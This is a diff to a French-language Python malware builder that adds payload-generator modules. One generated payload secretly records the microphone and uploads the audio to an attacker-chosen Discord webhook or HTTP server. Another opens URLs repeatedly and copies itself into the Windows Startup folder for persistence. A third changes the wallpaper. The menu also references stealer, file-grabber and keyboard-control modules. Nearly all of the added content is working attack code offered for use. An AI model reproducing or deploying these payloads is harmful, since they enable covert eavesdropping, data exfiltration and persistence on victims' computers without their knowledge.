@@ -984,10 +984,245 @@ if __name__ == "__main__":
             if num in options:
                 options[num]()
 
-#def voicerec():
-#
-#def wallpaper():
-#
+def voicerecorder_module():
+    clear()
+
+    choix = {
+        "Durée de l'enregistrement": 10,
+        "Envoi par Discord": None,
+        "Envoi par serveur HTTP": None,
+    }
+
+    def affichage():
+        clear()
+        print("=== Configuration Voice Recorder Payload ===\n\n")
+        print(f"""
+{Fore.YELLOW}Options : 
+{Fore.WHITE}
+1. Durée de l'enregistrement (en secondes)
+
+{Fore.YELLOW}Sortie et envoi:
+
+2. Envoi par Discord
+3. Envoi par serveur HTTP
+
+{Fore.GREEN}
+set <num>   pour configurer
+show        pour afficher la config
+create      pour générer
+exit        pour revenir
+{Style.RESET_ALL}
+""")
+
+    # -------------------------
+    # OPTIONS
+    # -------------------------
+    def set_duree():
+        val = input("Entrez la durée de l'enregistrement (en secondes) : ").strip()
+        if val.isdigit():
+            choix["Durée de l'enregistrement"] = int(val)
+        else:
+            print("Durée invalide.")
+            input("Appuyez sur Entrée...")
+        affichage()
+
+    def set_discord():
+        val = input("Entrez le webhook Discord (laisser vide pour ne pas envoyer) : ").strip()
+        choix["Envoi par Discord"] = val if val else None
+        affichage()
+
+    def set_http():
+        val = input("Entrez l'URL du serveur HTTP (laisser vide pour ne pas envoyer) : ").strip()
+        choix["Envoi par serveur HTTP"] = val if val else None
+        affichage()
+
+    options = {
+        "1": set_duree,
+        "2": set_discord,
+        "3": set_http
+    }
+
+    # -------------------------
+    # PAYLOAD
+    # -------------------------
+    def create_payload():
+        clear()
+        print("=== Payload Voice Recorder Généré ===\n")
+        duree = choix["Durée de l'enregistrement"]
+        discord_webhook = choix["Envoi par Discord"]
+        http_server = choix["Envoi par serveur HTTP"]
+
+        payload = f"""
+import os
+os.system("pip install sounddevice wavio requests")
+
+import sounddevice as sd
+import wavio
+import time
+
+def record_voice():
+    duration = {duree}  # Durée en secondes
+    fs = 44100
+    print("Enregistrement en cours...")
+    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
+    sd.wait()
+    filename = "voice_recording.wav"
+    wavio.write(filename, recording, fs, sampwidth=2)
+    print(f"Enregistrement terminé. Fichier sauvegardé sous {{filename}}")
+    return filename
+
+def send_to_discord(webhook_url, file_path):
+    import requests
+    with open(file_path, 'rb') as f:
+        files = {{'file': f}}
+        response = requests.post(webhook_url, files=files)
+    if response.status_code == 204:
+        print("Fichier envoyé sur Discord avec succès.")
+    else:
+        print("Échec de l'envoi sur Discord.")
+
+def send_to_http(server_url, file_path):
+    import requests
+    with open(file_path, 'rb') as f:
+        files = {{'file': f}}
+        response = requests.post(server_url, files=files)
+    if response.status_code == 200:
+        print("Fichier envoyé au serveur HTTP avec succès.")
+    else:
+        print("Échec de l'envoi au serveur HTTP.")
+
+if __name__ == "__main__":
+    recorded_file = record_voice()
+"""
+        if discord_webhook:
+            payload += f'    send_to_discord(r"{discord_webhook}", recorded_file)\n'
+        if http_server:
+            payload += f'    send_to_http(r"{http_server}", recorded_file)\n'
+
+        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "voicerec_payload.py")
+        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
+        with open(payload_path, "w", encoding="utf-8") as f:
+            f.write(payload)
+
+        print(f"Payload créé : {payload_path}")
+        input("Appuyez sur Entrée pour continuer...")
+
+    # -------------------------
+    # LOOP
+    # -------------------------
+    while True:
+        affichage()
+        cmd = input(">> ").strip().lower()
+
+        if cmd == "exit":
+            break
+        elif cmd.startswith("set "):
+            num = cmd.split()[1]
+            if num in options:
+                options[num]()
+            else:
+                print("Numéro d'option invalide.")
+                input("Appuyez sur Entrée...")
+        elif cmd == "show":
+            clear()
+            print("\nConfiguration actuelle du module Voice Recorder :")
+            for k, v in choix.items():
+                print(f"{k}: {v}")
+            input("\nAppuyez sur Entrée...")
+        elif cmd == "create":
+            create_payload()
+        else:
+            print("Commande invalide.")
+            input("Appuyez sur Entrée...")
+
+def wallpaper_module():
+    global code
+
+    choix = {
+        "Wallpaper": None,
+    }
+
+    def affichage_wallpaper():
+        clear()
+        print(Fore.CYAN + "=== Wallpaper ===\n\n" + Style.RESET_ALL)
+        print(f"""
+          
+          {Fore.YELLOW}Options : 
+{Fore.WHITE}
+    1. Mettre un Wallpaper
+
+              {Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : create pour générer
+Tapez : exit pour quitter{Style.RESET_ALL}
+          """)
+
+    # -------------------------
+    # OPTIONS
+    # -------------------------
+    def set_wallpaper():
+        path = input("Chemin image : ").strip()
+        if os.path.isfile(path):
+            choix["Wallpaper"] = path
+        else:
+            print("Chemin invalide")
+            time.sleep(1)
+
+    options = {
+        "1": set_wallpaper
+    }
+
+    # -------------------------
+    # PAYLOAD
+    # -------------------------
+    def create_payload():
+        global code
+
+        if not choix["Wallpaper"]:
+            print("Wallpaper requis")
+            time.sleep(1)
+            return
+
+        code += f"""
+import ctypes
+
+WALLPAPER = r"{choix["Wallpaper"]}"
+
+def set_wallpaper():
+    SPI_SETDESKWALLPAPER = 20
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER,
+            0,
+            WALLPAPER,
+            3
+        )
+        print("Wallpaper appliqué")
+    except Exception as e:
+        print(f"Erreur : {{e}}")
+
+set_wallpaper()
+"""
+
+    # -------------------------
+    # LOOP
+    # -------------------------
+    while True:
+        affichage_wallpaper()
+        cmd = input(">> ").strip().lower()
+
+        if cmd == "exit":
+            break
+
+        elif cmd == "valider":
+            create_payload()
+            break
+
+        elif cmd.startswith("set "):
+            num = cmd.split()[1]
+            if num in options:
+                options[num]()
 #def search_interceptor():
 #
 def directory_listing_module():
@@ -1334,7 +1569,163 @@ while True:
 
     time.sleep(5)
 """
-#def openurl():
+def openurl():
+    global code
+
+    choix = {
+        "URL": None,
+        "Démarrage": False,
+        "Fenêtre": False,
+        "Onglet": False,
+        "Nombre": 1,
+        "Délai": 0,
+    }
+
+    def affichage_url():
+        clear()
+        print(Fore.CYAN + "=== Open URL ===\n\n" + Style.RESET_ALL)
+        print(f"""
+          
+          {Fore.YELLOW}Options : 
+{Fore.WHITE}
+    1. URL à ouvrir
+    2. Navigateur à utiliser (par défaut : système)
+    3. Ouvrir en fenêtre 
+    4. Ouvrir en onglet
+    5. Nombre de fois à ouvrir
+    6. Délai entre les ouvertures (si option 5 configurée)
+          
+{Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : create pour générer
+Tapez : exit pour quitter
+            {Style.RESET_ALL}
+
+          """)
+    # -------------------------
+    # OPTIONS
+    # -------------------------
+    def set_url():
+        val = input("URL : ").strip()
+        if val:
+            choix["URL"] = val
+
+    def set_startup():
+        val = input("Démarrage ? (y/n) : ").lower()
+        choix["Démarrage"] = (val == "y")
+
+    def set_window():
+        val = input("Fenêtre ? (y/n) : ").lower()
+        choix["Fenêtre"] = (val == "y")
+
+    def set_tab():
+        val = input("Onglet ? (y/n) : ").lower()
+        choix["Onglet"] = (val == "y")
+
+    def set_count():
+        try:
+            val = int(input("Nombre : "))
+            choix["Nombre"] = max(1, val)
+        except:
+            pass
+
+    def set_delay():
+        try:
+            val = int(input("Délai : "))
+            choix["Délai"] = max(0, val)
+        except:
+            pass
+
+    options = {
+        "1": set_url,
+        "2": set_startup,
+        "3": set_window,
+        "4": set_tab,
+        "5": set_count,
+        "6": set_delay,
+    }
+
+    # -------------------------
+    # PAYLOAD
+    # -------------------------
+    def create_payload():
+        global code
+
+        if not choix["URL"]:
+            print("URL requise")
+            time.sleep(1)
+            return
+
+        code += f"""
+import webbrowser
+import time
+import os
+import sys
+
+URL = {repr(choix["URL"])}
+STARTUP = {choix["Démarrage"]}
+WINDOW = {choix["Fenêtre"]}
+TAB = {choix["Onglet"]}
+COUNT = {choix["Nombre"]}
+DELAY = {choix["Délai"]}
+
+def open_url():
+
+    if STARTUP:
+        if sys.platform == "win32":
+            startup = os.path.join(
+                os.getenv("APPDATA"),
+                "Microsoft",
+                "Windows",
+                "Start Menu",
+                "Programs",
+                "Startup"
+            )
+            path = os.path.abspath(sys.argv[0])
+            dest = os.path.join(startup, "open_url_payload.py")
+
+            if not os.path.exists(dest):
+                try:
+                    import shutil
+                    shutil.copy2(path, dest)
+                except Exception as e:
+                    print(f"Erreur startup : {{e}}")
+
+    if WINDOW:
+        webbrowser.open_new(URL)
+    elif TAB:
+        webbrowser.open_new_tab(URL)
+    else:
+        webbrowser.open(URL)
+
+def run_open_url():
+    for _ in range(COUNT):
+        if DELAY > 0:
+            time.sleep(DELAY)
+        open_url()
+
+run_open_url()
+"""
+
+    # -------------------------
+    # LOOP
+    # -------------------------
+    while True:
+        affichage_url()
+        cmd = input(">> ").strip().lower()
+
+        if cmd == "exit":
+            break
+
+        elif cmd == "valider":
+            create_payload()
+            break
+
+        elif cmd.startswith("set "):
+            num = cmd.split()[1]
+            if num in options:
+                options[num]()
 
 def affichage_addpayload(modules_choisis):
     global modules_disponibles, affichage_
@@ -1352,7 +1743,7 @@ def affichage_addpayload(modules_choisis):
     6. Stealer
     7. Voice Record
     8. Change Wallpaper
-    9. Search Interceptor
+    9. Search Interceptor (en développement)
     10. Directory Lister
     11. File Grabber
     12. Keyboard Control
@@ -1382,20 +1773,20 @@ Tapez : valider pour valider
                 shutdown_module()
             elif module == "Stealer":
                 steal_module()
-            #elif module == "Voice Record":
-            #    voicerec()
-            #elif module == "Change Wallpaper":
-            #    wallpaper()
+            elif module == "Voice Record":
+                voicerecorder_module()
+            elif module == "Change Wallpaper":
+                wallpaper_module()
             #elif module == "Search Interceptor":
             #    search_interceptor()
-            #elif module == "Directory Lister":
-            #    dirlister()
-            #elif module == "File Grabber":
-            #    filegrab()
-            #elif module == "Keyboard Control":
-            #    keybcontrol()
-            #elif module == "Open URL":
-            #    openurl()
+            elif module == "Directory Lister":
+                directory_listing_module()
+            elif module == "File Grabber":
+                filegrab()
+            elif module == "Keyboard Control":
+                keybcontrol()
+            elif module == "Open URL":
+                openurl()
     
 
 
@@ -1435,5 +1826,3 @@ def multipayload_module():
 
             print(Fore.GREEN + "Payload généré dans payload/final_payload.py" + Style.RESET_ALL)
             break
-
-multipayload_module()
